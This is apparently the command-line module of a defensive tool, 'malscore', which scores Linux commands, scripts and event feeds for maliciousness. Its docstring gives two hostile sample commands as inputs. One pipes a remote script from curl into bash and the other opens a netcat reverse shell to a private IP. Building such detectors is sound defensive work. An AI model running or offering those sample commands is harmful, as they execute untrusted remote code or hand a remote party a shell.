"""Command-line interface.

    malscore "curl -s http://1.2.3.4/x.sh | bash"     # score one command
    malscore -f deploy.sh                              # score a whole script
    echo "nc -e /bin/sh 10.0.0.1 4444" | malscore -    # read from stdin
    malscore --batch events.jsonl                      # score a JSONL feed
    malscore -f suspicious.sh --json                   # machine-readable output
"""

from __future__ import annotations

import argparse
import gzip
import io
import json
import os
import sys
from typing import Any, Dict, Iterator, List, Optional, Sequence, Tuple

from .scoring import VERDICTS, Analyzer, Assessment

VERDICT_COLOR = {
    "benign": "32", "low": "36", "medium": "33", "high": "35", "critical": "31",
}
BAR_WIDTH = 24

#: Field names that may carry the command line (or argv list) in a feed record.
COMMAND_KEYS = ("cmdline", "command", "cmd", "command_line", "commandline",
                "proctitle", "exe_args", "args_string")
USER_KEYS = ("user", "username", "user_name", "acct", "auid_name", "subject_user")
TIME_KEYS = ("timestamp", "time", "@timestamp", "ts", "event_time", "start_time",
             "eventTime", "datetime")


# --------------------------------------------------------------------------
# rendering
# --------------------------------------------------------------------------
def _supports_color(stream) -> bool:
    return hasattr(stream, "isatty") and stream.isatty() and os.environ.get("NO_COLOR") is None


def _paint(text: str, code: str, enabled: bool) -> str:
    return "\033[%sm%s\033[0m" % (code, text) if enabled else text


def _bar(score: int, enabled: bool, verdict: str) -> str:
    filled = int(round(score / 100 * BAR_WIDTH))
    return _paint("█" * filled + "░" * (BAR_WIDTH - filled), VERDICT_COLOR[verdict], enabled)


def _truncate(text: str, width: int) -> str:
    text = text.replace("\n", " ")
    return text if len(text) <= width else text[: width - 1] + "…"


def render_text(assessment: Assessment, color: bool, explain: bool, title: str = "") -> str:
    verdict = assessment.verdict
    lines: List[str] = ["%s  score %3d/100  %s" % (
        _bar(assessment.score, color, verdict),
        assessment.score,
        _paint(verdict.upper(), VERDICT_COLOR[verdict] + ";1", color),
    )]
    if title:
        lines.append("  " + title)
    if assessment.tactics:
        lines.append("  tactics: " + ", ".join(assessment.tactics))

    if assessment.per_statement:
        flagged = [s for s in assessment.per_statement if s.hits]
        lines.append("")
        lines.append("  %d statement(s), %d flagged:" % (len(assessment.per_statement), len(flagged)))
        for statement in flagged:
            lines.append("    %s L%-4d %3d %-8s %s" % (
                _bar(statement.score, color, statement.verdict),
                statement.line, statement.score, statement.verdict,
                _truncate(statement.command, 60)))

    if explain and assessment.hits:
        lines.append("")
        lines.append("  evidence:")
        for hit in assessment.hits:
            lines.append("    [%0.2f] %-28s %s" % (hit.weight, hit.tactic, hit.title))
            if hit.techniques:
                lines.append("           %s" % " ".join(hit.techniques))
    elif assessment.hits:
        lines.append("  signals: " + ", ".join(h.id for h in assessment.hits[:6])
                     + (" ..." if len(assessment.hits) > 6 else ""))
    return "\n".join(lines)


# --------------------------------------------------------------------------
# input
# --------------------------------------------------------------------------
def _first(record: Dict[str, Any], keys: Sequence[str]) -> Any:
    """The first present, non-empty value among ``keys``."""
    for key in keys:
        value = record.get(key)
        if value not in (None, "", []):
            return value
    return None


def read_feed(path: str) -> Iterator[Tuple[int, Dict[str, Any]]]:
    """Yield ``(line, record)`` from a JSON Lines file or a JSON array of objects.

    ``-`` reads stdin and a ``.gz`` suffix is decompressed.  Malformed lines and
    non-object entries are skipped, so one bad record never aborts a feed.
    """
    if path == "-":
        text = sys.stdin.read()
    elif path.endswith(".gz"):
        with io.TextIOWrapper(gzip.open(path, "rb"), encoding="utf-8", errors="replace") as handle:
            text = handle.read()
    else:
        with open(path, "r", encoding="utf-8", errors="replace") as handle:
            text = handle.read()

    if text.lstrip().startswith("["):
        try:
            records = json.loads(text)
        except json.JSONDecodeError as exc:
            raise SystemExit("malscore: %s is not valid JSON: %s" % (path, exc))
        for index, record in enumerate(records, start=1):
            if isinstance(record, dict):
                yield index, record
        return

    for index, line in enumerate(text.splitlines(), start=1):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        try:
            record = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(record, dict):
            yield index, record


def _feed_command(record: Dict[str, Any]) -> str:
    """Accept a string command line or an argv list (auditd/eBPF style)."""
    value = _first(record, COMMAND_KEYS)
    if isinstance(value, (list, tuple)):
        return " ".join(str(part) for part in value)
    return "" if value is None else str(value)


def _read_input(args: argparse.Namespace) -> Optional[str]:
    if args.file:
        with open(args.file, "r", encoding="utf-8", errors="replace") as handle:
            return handle.read()
    if args.command == ["-"] or (not args.command and not sys.stdin.isatty()):
        return sys.stdin.read()
    if args.command:
        return " ".join(args.command)
    return None


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------
def _score_batch(analyzer: Analyzer, args: argparse.Namespace, color: bool) -> int:
    """Score each command in a feed; return the worst verdict rank seen."""
    threshold = VERDICTS.index(args.min_verdict) if args.min_verdict else 0
    worst = 0
    shown = 0
    for line, record in read_feed(args.batch):
        assessment = analyzer.assess_command(_feed_command(record), line=line)
        rank = VERDICTS.index(assessment.verdict)
        worst = max(worst, rank)
        if rank < threshold:
            continue
        shown += 1
        if args.json:
            result = assessment.as_dict(include_statements=False)
            for name, keys in (("user", USER_KEYS), ("timestamp", TIME_KEYS)):
                value = _first(record, keys)
                if value is not None:
                    result[name] = value
            print(json.dumps(result))
        else:
            print("%s %3d %-8s %s" % (_bar(assessment.score, color, assessment.verdict),
                                      assessment.score, assessment.verdict,
                                      _truncate(assessment.command, 70)))
    if not args.json:
        sys.stderr.write("scored feed; %d event(s) at or above '%s'\n" % (shown, args.min_verdict or "benign"))
    return worst


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="malscore",
        description="Score the maliciousness of a Linux command or shell script (0-100).",
        epilog="The tool never executes what it analyses; it only reads the text.",
    )
    parser.add_argument("command", nargs="*", help="command to score, or '-' to read stdin")
    parser.add_argument("-f", "--file", help="score a shell script file")
    parser.add_argument("--batch", help="score every command in a JSONL/array event feed")
    parser.add_argument("-c", "--command-mode", action="store_true",
                        help="treat input as a single command even if it spans lines")
    parser.add_argument("-j", "--json", action="store_true", help="emit JSON instead of text")
    parser.add_argument("-e", "--explain", action="store_true",
                        help="list every signal with its weight and MITRE techniques")
    parser.add_argument("--redact", action="store_true",
                        help="redact credential-looking values before echoing any command text")
    parser.add_argument("--min-verdict", choices=VERDICTS,
                        help="in --batch, only print events at or above this verdict")
    parser.add_argument("--fail-on", choices=VERDICTS,
                        help="exit 2 if the verdict is at or above this band")
    parser.add_argument("--no-color", action="store_true", help="disable ANSI colour")
    return parser


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    color = not args.no_color and not args.json and _supports_color(sys.stdout)
    analyzer = Analyzer(redact=args.redact)

    if args.batch:
        worst = _score_batch(analyzer, args, color)
    else:
        text = _read_input(args)
        if text is None or not text.strip():
            parser.error("provide a command, -f FILE, --batch FILE, or pipe via stdin")
        assessment = analyzer.assess_command(text.strip()) if args.command_mode else analyzer.assess(text)
        if args.json:
            print(json.dumps(assessment.as_dict(), indent=2))
        else:
            title = os.path.basename(args.file) if args.file else ""
            print(render_text(assessment, color, args.explain, title=title))
        worst = VERDICTS.index(assessment.verdict)

    if args.fail_on and worst >= VERDICTS.index(args.fail_on):
        return 2
    return 0
